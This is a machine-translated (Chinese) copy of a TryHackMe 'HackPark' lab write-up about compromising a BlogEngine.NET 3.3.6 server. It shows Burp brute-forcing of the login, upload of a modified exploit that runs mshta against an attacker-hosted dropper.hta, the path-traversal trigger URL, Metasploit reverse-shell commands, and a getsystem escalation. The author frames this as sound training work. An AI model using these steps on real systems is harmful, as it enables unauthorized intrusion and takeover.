<html>
<head>
<title>TryHackMe writeup: HackPark</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:HackPark</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262?source=collection_archive---------4-----------------------#2022-05-25">https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262?source=collection_archive---------4-----------------------#2022-05-25</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="2523" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">hack park(<a class="ae kp" href="https://tryhackme.com/room/hackpark" rel="noopener ugc nofollow" target="_blank">“tryhackme”，2019 </a>)是一个TryHackMe教程室，用户“在网站登录九头蛇之前，识别并使用公共漏洞，然后提升你在这台Windows机器上的权限”(逐字引自<a class="ae kp" href="https://tryhackme.com/room/hackpark" rel="noopener ugc nofollow" target="_blank">同上</a>)。这是一个有趣的房间(至少对我来说)。我花了将近一个月的时间来完成这个房间，因为我有“打破规则”的倾向，但我还是完成了。我将在这篇文章中讨论我对这个房间的体验。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj kq"><img src="../Images/61b090fc7f168d113f96cf89f31ff768.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aBdY6R4sGVsbTGvRzxwTxA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">基础图片:<a class="ae kp" href="https://www.youtube.com/watch?v=WXBHCQYxwr0" rel="noopener ugc nofollow" target="_blank">《艾娃麦克斯》(2018) </a></figcaption></figure><h1 id="b539" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">程序</h1><p id="7725" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">在我开始之前，我必须定义这个房间的目标。在这种情况下，利用目标系统上的漏洞获取权限较低的用户帐户，然后利用权限提升漏洞获取系统级权限。然后我必须转储<code class="fe mj mk ml mm b">user.txt</code>和<code class="fe mj mk ml mm b">root.txt</code>标志。</p><p id="e591" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">因此，我点击了第一个任务右上角的绿色“启动机器”按钮，并开始将目标机器的动态IP地址添加到我的攻击箱的<code class="fe mj mk ml mm b">/etc/hosts</code>配置文件中。</p><h2 id="2b3c" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">侦察</h2><p id="a616" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">这个房间运行着一个网络服务器，所以我运行了Burp Suite ( <a class="ae kp" href="https://portswigger.net/burp/communitydownload" rel="noopener ugc nofollow" target="_blank"> PortSwigger，n.d.-a </a>)并访问了目标网站的内置浏览器。以下(图1)是主页中出现的内容:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj mz"><img src="../Images/a80ba06c5e95c5ea78e4b355e8a3e495.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aeNflb5LY6PUouIfDc2eZQ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图1 </strong></figcaption></figure><p id="f8a5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">作为被动侦察工作的一部分，竞争者要找出谁是主页上的小丑样人物(图1a)。通过逆向图像搜索和上下文线索，我能够算出小丑的名字。</p><p id="7d39" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">之后，我寻找一种方法来利用面向web应用程序来访问管理员面板。主页右上角的三条横条(图1b)似乎是某种网站导航工具栏的按钮。单击它会出现以下菜单窗格(图2):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj na"><img src="../Images/5fc0328a31b10c4668528a5d1a5236d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/1*2_AujaYewB986I08JcDauA.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图2 </strong></figcaption></figure><p id="fd7e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我对进入登录页面很感兴趣，这样我就可以尝试利用某种文件上传漏洞来利用系统，短期目标是建立一个meter preter(<a class="ae kp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank">Metasploit Unleashed，n.d. </a>)会话。点击“登录”(图2a)，出现以下页面(图3):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nb"><img src="../Images/53f3a52dfcf6f07221a581399967e08e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wiUvHSCeJbWxtnpfz4DZ8g.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图3 </strong></figcaption></figure><p id="3756" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为这个网站提供动力的内容管理系统叫做<a class="ae kp" href="https://blogengine.io/" rel="noopener ugc nofollow" target="_blank">BlogEngine.NET</a>，在我继续开发它之前，我想我应该先试着登录这个东西。</p><p id="3fe1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">登录表单接受用户名(图3a)和密码(图3b)。我用<code class="fe mj mk ml mm b">dna</code>作为用户名，<code class="fe mj mk ml mm b">deniers</code>作为密码，点击“登录”(图3c)，得到如下页面(图4):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nc"><img src="../Images/50c5e8713e2e1b6a1384dab1587ba700.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_oMjGxLFsOVOcR0GCVjFlQ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图4 </strong></figcaption></figure><p id="e991" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">正如我所料，登录会失败(图4a)。Burp Suite记录了这些请求和响应，现在我可以使用它们对面板进行暴力攻击来获取凭证。切换到Burp Suite主窗口(图5)，我计算出代表失败登录的<strong class="jt iv"> POST </strong>请求(图5a)，然后将其转发给Burp的<em class="nd">入侵者</em>功能(图5b):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj ne"><img src="../Images/60850dcc9c8dcde57873cd07640b9e4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_HVY4Dvo_xoKDIJeHdkA-Q.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图5 </strong></figcaption></figure><p id="2826" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我不想讨论关于配置Burp Suite来暴力破解web表单的细节，因为这将花费比所需时间更长的时间，但我确实想关注一下<em class="nd"> POST </em>请求中的这个特定字段:</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="0607" class="mn lh iu mm b gz nj nk l nl nm">[...] &amp;ctl00%24MainContent%24LoginUser%24UserName=<strong class="mm iv">§dna§</strong>&amp;ctl00%24MainContent%24LoginUser%24Password=<strong class="mm iv">§deniers§</strong>&amp; [...]</span></pre><p id="cb9f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将使用<em class="nd">集束炸弹</em> ( <a class="ae kp" href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types" rel="noopener ugc nofollow" target="_blank"> PortSwigger，n.d.-b </a>)攻击强力攻击web应用程序，其中Burp Suite将尝试使用各种用户名和密码组合登录。我建议阅读手册(<a class="ae kp" href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types" rel="noopener ugc nofollow" target="_blank">同上。</a>)来了解更多关于设置这种攻击的信息。</p><p id="7265" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">但是关于这个特殊的<em class="nd"> POST </em>字段，我可以配置Burp Suite来攻击<code class="fe mj mk ml mm b">&amp;ctl00%24MainContent%24LoginUser%24UserName=</code>和<code class="fe mj mk ml mm b">ctl00%24MainContent%24LoginUser%24Password=</code>参数，它们分别代表用户名和密码字段。然后，我需要配置有效负载，以匹配一系列常用用户名和常用密码，然后发起攻击。下面的窗口(图6)显示了强力的作用:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nn"><img src="../Images/6477e6a1611b6139db86de3755914f8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F9f-0aOsRfjh_h-DHHsNaA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图6 </strong></figcaption></figure><p id="92c3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Burp Suite尝试使用不同的密码和不同的用户名登录。结果选项卡(图6a)显示了Burp Suite已经尝试的内容。<code class="fe mj mk ml mm b">Payload1</code>列(图6b)显示测试的用户名，<code class="fe mj mk ml mm b">Payload2</code>列(图6c)显示测试的密码，<code class="fe mj mk ml mm b">Status</code>列显示尝试有效负载后的HTTP响应代码，<code class="fe mj mk ml mm b">Length</code>列显示响应的大小(我想是以字节为单位？).</p><p id="1925" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mj mk ml mm b">Status</code>和<code class="fe mj mk ml mm b">Length</code>列很重要，因为我在寻找响应中的异常。不同的HTTP响应代码(如3xx或4xx)或更大或更小的响应可能表示Burp Suite找到了成功的用户名和密码组合。我对此的推理是，不正确的用户名和密码组合更有可能产生类似的“登录失败”响应，而唯一的用户名和密码将产生新的“登录成功”响应大小或HTTP响应代码。</p><p id="57b7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这个过程持续了一段时间，最终，我得到了以下候选用户名和密码组合:用户名<code class="fe mj mk ml mm b">admin</code>和密码<code class="fe mj mk ml mm b">1qaz2wsx</code>。我试图登录应用程序<em class="nd"> a la </em>图4，出现了BlogEngine。NET的管理员仪表板(图7):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj no"><img src="../Images/938afd9a9fd36ee8abb9055df43c0fb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wY3ZONRZAXfNFyzqh9wgkw.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图7 </strong></figcaption></figure><h2 id="639e" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">初始访问</h2><p id="d3fc" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">通过访问目标机器的BlogEngine.NET仪表板，我现在可以开始考虑利用面板的方法了。我认为首先弄清楚目标机器运行的是哪个版本的BlogEngine会很有用。我点击了左边工具栏上的“关于”按钮(图8c)，版本被列为<code class="fe mj mk ml mm b">3.3.6.0</code>。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj np"><img src="../Images/df068b91300b091b7dd16e182e6abac0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PC9_CILWQF8sFPqd3QLKcA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图8 </strong></figcaption></figure><p id="a566" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我对博客引擎<code class="fe mj mk ml mm b">3.3.6.0</code>中存在何种漏洞进行了粗略的研究，这让我注意到了由<a class="ae kp" href="https://seclists.org/fulldisclosure/2019/Jun/26" rel="noopener ugc nofollow" target="_blank"> Bishop (2019) </a>撰写的一份报告，该报告展示了影响博客引擎<code class="fe mj mk ml mm b">3.3.6.0</code>和之前版本的<em class="nd">本地文件包含</em>和<em class="nd">远程代码执行</em>缺陷。</p><p id="ee9c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，<a class="ae kp" href="https://www.exploit-db.com/exploits/46353" rel="noopener ugc nofollow" target="_blank">科布(2019) </a>进行了实际利用。最初的漏洞利用打开了攻击箱的反向外壳，但是我认为我应该“打破规则”一点，修改漏洞利用来做一些更有趣的事情(并且对我自己来说更方便)。</p><p id="5c07" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我修改了最初的漏洞，改为启动HTML应用程序驱动的有效载荷(见<a class="ae kp" href="https://docs.microsoft.com/en-us/previous-versions/ms536495(v=vs.85)" rel="noopener ugc nofollow" target="_blank"> Microsoft Docs，2013 </a>)，可以配置为自动启动反向Meterpreter外壳。我最初修改了这个漏洞，以启动一个<code class="fe mj mk ml mm b">web_delivery</code>工具来传递一个反向shell，但是当我设置的监听器获得一个连接时，由于某种原因没有产生一个shell。</p><p id="69e4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">因此，我尝试了许多其他方法来启动代码，并决定休息一下。直到我做了另一次TryHackMe room ( <a class="ae kp" rel="noopener ugc nofollow" target="_blank" href="/tryhackme-writeup-atlas-c3dff235d109"> Aleksey，2022 </a>)后，我才意识到<code class="fe mj mk ml mm b">web_delivery</code>有效载荷总体上是失败的，所以我必须想出另一种方法来交付Meterpreter有效载荷。我使用了一种由<a class="ae kp" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="noopener ugc nofollow" target="_blank"> Chandel (2019) </a>描述的技术，该技术使用HTA作为传递机制。以下是我对Cobb exploit的实现:</p><figure class="kr ks kt ku gu kv"><div class="bz fq l di"><div class="nq nr l"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">我对科布的利用的看法</figcaption></figure><p id="e0ed" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">而不是用。NET框架的套接字编程库，我版本的Cobb exploit将改为通过启动进程(Ln)来访问远程HTML应用程序。25, 30).具体来说，它将通过<code class="fe mj mk ml mm b">mshta.exe</code>可执行文件(Ln。26，27)并且不创建窗口(Ln。29)希望“保持隐蔽”</p><p id="39c4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">注意</strong>我<strong class="jt iv">没有</strong>测试过这种初级的隐形，所以在现实生活中它可能不合适或者不“有效”。尽管如此，在这个房间里它确实对我有用，所以我就跟着它走了。</p><p id="2306" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我通过将漏洞上传到<em class="nd">blogenine CMS</em>上来利用这个漏洞。需要上传文件名为<code class="fe mj mk ml mm b">PostView.ascx</code>的文件，以便触发攻击。所以我用那个名字复制了一份。</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="c736" class="mn lh iu mm b gz nj nk l nl nm"><strong class="mm iv">┌──(dna@deniers)-[~/hackpark]<br/>└─$ cp bexploit.cs PostView.ascx</strong><br/>                                                                                                                                  <br/><strong class="mm iv">┌──(dna@deniers)-[~/hackpark]<br/>└─$</strong></span></pre><p id="c5de" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我开始启动Metasploit来处理传入的Meterpreter反向shell:</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="8838" class="mn lh iu mm b gz nj nk l nl nm"><strong class="mm iv">┌──(dna@deniers)-[~/hackpark]<br/>└─$ sudo msfconsole                    <br/>[sudo] password for dna: *inserts password*</strong></span><span id="9bd0" class="mn lh iu mm b gz ns nk l nl nm"><strong class="mm iv">msf6 &gt; use exploit/windows/misc/hta_server</strong><br/>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><span id="18a6" class="mn lh iu mm b gz ns nk l nl nm"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; exploit</strong><br/>[*] Exploit running as background job 0.<br/>[*] Exploit completed, but no session was created.</span><span id="262e" class="mn lh iu mm b gz ns nk l nl nm">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4444 <br/>[*] Using URL: http://&lt;attackbox ip&gt;:8080/dropper.hta<br/>[*] Server started.<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt;</strong></span></pre><p id="54d2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我编辑了带有参数的<code class="fe mj mk ml mm b">PostView.ascx</code>文件，该参数指向我的AttackBox (Ln)上的Meterpreter HTML应用程序。27):</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="deb9" class="mn lh iu mm b gz nj nk l nl nm">[... snip ...]<br/>payload.StartInfo.Arguments = <strong class="mm iv">"http://&lt;attackbox ip&gt;:8080/dropper.hta"</strong>; // url to HTA with payload<br/>[... snip ...]</span></pre><p id="6d6c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我通过首先进入内容部分(图8a)将漏洞上传到CMS中，这将给我一个在网站上发表的文章列表。然后我转到“欢迎来到HackPark”这篇文章(图8b)，它给了我以下网页(图9):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj nt"><img src="../Images/462bd2b39c6b190340dba0bc245c0217.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*PiEKupZrNfBI0E6rVCJw4w.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图9 </strong></figcaption></figure><p id="eafd" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我需要把<code class="fe mj mk ml mm b">PostView.ascx</code>文件上传到服务器上。这是通过点击带有文件夹图标的按钮(图9a)实现的，这将打开以下对话框(图10):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nu"><img src="../Images/da6c15ea705482769f81b908f145d415.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*77AIRzBp_8t5j2clTo9UgQ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图10 </strong></figcaption></figure><p id="5b0a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我点击“上传”按钮(图10a)，另一个对话框出现，我必须选择要上传的<code class="fe mj mk ml mm b">PostView.ascx</code>文件，我这样做了，并得到以下结果，通知我我成功了(图11a/b):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nv"><img src="../Images/48e49ecf05dcb4dc96f2dac49ed370d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7uAJ0L2gCSIXQMIC2i7NyQ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图11 </strong></figcaption></figure><p id="b3f4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我通过从我的攻击箱的浏览器访问以下URL: <code class="fe mj mk ml mm b">http://hackpark.thm/?theme=../../App_Data/files</code>触发了该漏洞，并得到以下页面:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nw"><img src="../Images/671b5c8c4113bb96c058cab978b61195.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*36UYwXACml2QQW9rPiHz0g.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图12 </strong></figcaption></figure><p id="299f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">之后，来自目标机器的Meterpreter会话出现在我面前:</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="1134" class="mn lh iu mm b gz nj nk l nl nm"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt;</strong> [*] hackpark.thm    hta_server - Delivering Payload<br/>[*] Sending stage (175174 bytes) to hackpark.thm<br/>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4444 -&gt; hackpark.thm:49423 ) at [redacted] -0400</span><span id="6a73" class="mn lh iu mm b gz ns nk l nl nm"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt;</strong></span></pre><h2 id="5c76" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">后剥削</h2><p id="0c40" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">在利用目标机器并获得那个Meterpreter反向shell后，我开始与它进行交互，并自动用<code class="fe mj mk ml mm b">getsystem</code>获得系统权限:</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="b2a4" class="mn lh iu mm b gz nj nk l nl nm"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; sessions -i 1</strong><br/>[*] Starting interaction with 1...</span><span id="5378" class="mn lh iu mm b gz ns nk l nl nm"><strong class="mm iv">meterpreter &gt; getsystem</strong><br/>...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).<br/><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="62c9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">注意</strong>我应该利用一个服务来获得系统特权，但这正是这个房间所期待的，就像一部好的喜剧，我喜欢以这样一种方式来挑战我的读者的“第二次猜测”😉</p><p id="7425" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在，我可以继续从系统中转储用户和根标志:</p><pre class="kr ks kt ku gu nf mm ng nh aw ni bi"><span id="6280" class="mn lh iu mm b gz nj nk l nl nm"><strong class="mm iv">meterpreter &gt; search -f user.txt</strong><br/>Found 2 results...<br/>==================</span><span id="a60e" class="mn lh iu mm b gz ns nk l nl nm">Path  Size (bytes)  Modified (UTC)<br/>----  ------------  --------------<br/>c:\Documents and Settings\jeff\Desktop\user.txt  32            [redacted] -0400<br/>c:\Users\jeff\Desktop\user.txt                   32            [redacted] -0400</span><span id="8fc1" class="mn lh iu mm b gz ns nk l nl nm"><strong class="mm iv">meterpreter &gt; cat C:\\Users\\jeff\\Desktop\\user.txt</strong><br/>[redacted]<strong class="mm iv">meterpreter &gt; search -f root.txt</strong><br/>Found 2 results...<br/>==================</span><span id="4609" class="mn lh iu mm b gz ns nk l nl nm">Path  Size (bytes)  Modified (UTC)<br/>----  ------------  --------------<br/>c:\Documents and Settings\Administrator\Desktop\root.txt  32            [redacted] -0400<br/>c:\Users\Administrator\Desktop\root.txt                   32            [redacted] -0400</span><span id="4e57" class="mn lh iu mm b gz ns nk l nl nm"><strong class="mm iv">meterpreter &gt; cat C:\\Users\\Administrator\\Desktop\\root.txt</strong><br/>[redacted]<strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="028f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="2b84" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">摘要</h1><p id="5d0a" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">这是一个有趣的房间。像往常一样，我违背了指令，决定使用打嗝套件而不是<code class="fe mj mk ml mm b">hydra</code>(部分原因是我不知道如何让<code class="fe mj mk ml mm b">hydra</code>攻击BlogEngine。NET的登录表单)，重写要利用的漏洞的有效载荷，并决定通过使用<code class="fe mj mk ml mm b">getsystem</code>而不是手动利用要利用的易受攻击的服务来结束。</p><h2 id="fded" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">外卖食品</h2><p id="d196" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">除了<a class="ae kp" href="https://seclists.org/fulldisclosure/2019/Jun/26" rel="noopener ugc nofollow" target="_blank"> Bishop (2019) </a>发现的漏洞和更多的理由相信打破规则是一件好事之外，这篇文章并没有“带走”太多东西；-)</p><h2 id="5d3b" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">插头</h2><p id="b61c" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">Mira Lazine ( <a class="ae kp" href="https://twitter.com/MiraLazine" rel="noopener ugc nofollow" target="_blank"> Twitter </a>、<a class="ae kp" href="https://medium.com/@MiraLazine" rel="noopener"> Medium </a>)和其他弱势群体需要您的帮助。如果可以，在下面的链接上给自己捐款:</p><ul class=""><li id="8381" class="nx ny iu jt b ju jv jy jz kc nz kg oa kk ob ko oc od oe of bi translated">米拉现金。app:<a class="ae kp" href="https://cash.app/$MiraLazine" rel="noopener ugc nofollow" target="_blank">https://cash.app/$MiraLazine</a></li><li id="476d" class="nx ny iu jt b ju og jy oh kc oi kg oj kk ok ko oc od oe of bi translated">现金伊西。app:<a class="ae kp" href="https://cash.app/$izzykilla" rel="noopener ugc nofollow" target="_blank">https://cash.app/$izzykilla</a></li><li id="6758" class="nx ny iu jt b ju og jy oh kc oi kg oj kk ok ko oc od oe of bi translated">迪. w .现金交易。app:【https://cash.app/$pitfirego T21】</li><li id="21dc" class="nx ny iu jt b ju og jy oh kc oi kg oj kk ok ko oc od oe of bi translated">迪·温默:<a class="ae kp" href="https://account.venmo.com/u/Spitfirego" rel="noopener ugc nofollow" target="_blank">https://account.venmo.com/u/Spitfirego</a></li><li id="7b37" class="nx ny iu jt b ju og jy oh kc oi kg oj kk ok ko oc od oe of bi translated">郭台铭谈现金。app:<a class="ae kp" href="https://cash.app/$octgayvian" rel="noopener ugc nofollow" target="_blank">https://cash.app/$octgayvian</a></li></ul><p id="8430" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">他们都需要经济援助，所以如果你能给他们几美元(或传播消息)，我们将不胜感激😍</p><h1 id="3ca8" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">参考</h1><p id="8ca5" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">阿列克谢(2022)。TryHackMe报道:Atlas。信息安全报道。2022年5月18日检索自:<a class="ae kp" rel="noopener ugc nofollow" target="_blank" href="/tryhackme-writeup-atlas-c3dff235d109">https://infosecwriteups . com/tryhackme-writeup-atlas-c3dff 235d 109</a></p><p id="fc05" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿列克谢(未标明)。<em class="nd">我的中间代码片段的要点</em>。GitHub Gists。2022年5月13日检索自:<a class="ae kp" href="https://gist.github.com/Alekseyyy/a621a72c2cf9b6487cf8313ccc2908eb#file-ctf-2022-tryhackme-hackpark-bexploit-cs" rel="noopener ugc nofollow" target="_blank">https://gist . github . com/Alekseyyy/a 621 a 72 C2 cf 9 b 6487 cf 8313 CCC 2908 EB # file-CTF-2022-tryhackme-hack park-bex ploit-cs</a></p><p id="2e33" 